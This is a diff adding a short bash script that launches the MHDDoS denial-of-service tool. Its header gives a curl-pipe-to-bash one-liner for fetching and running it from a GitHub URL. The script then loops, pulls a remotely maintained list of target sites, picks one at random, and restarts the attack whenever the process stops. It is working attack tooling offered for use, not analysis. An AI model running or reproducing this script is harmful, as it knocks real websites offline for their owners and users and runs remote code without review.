@@ -1,0 +1,28 @@
+##### Use next command in local linux terminal to run this script. #####
+#curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_init | cat | bash
+
+##### To kill script press CTRL+C several times.
+
+#!/bin/bash
+
+## Check every 10 sec if MHDDos is terminated. It happens often for some reason. Relaunch process if terminated.
+check_interval=10
+
+while true
+do
+
+## Get random target from list of sites
+site=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | shuf -n 1)
+
+## Cut "command line" from string. Everything before "#" is 'command line'
+cmd_line=$(echo $site | awk -F "#" '{print $1}')
+echo $cmd_line
+
+## check if MHDDoS running. If it's not yet running or was terminated by error launch it.
+if [ `ps aux | grep MHDDoS | wc -l` != "2" ]; then
+        echo $(date +%H":"%M)
+        echo "process is not running"
+        python3 ~/MHDDoS/start.py $cmd_line
+fi
+sleep $check_interval
+done
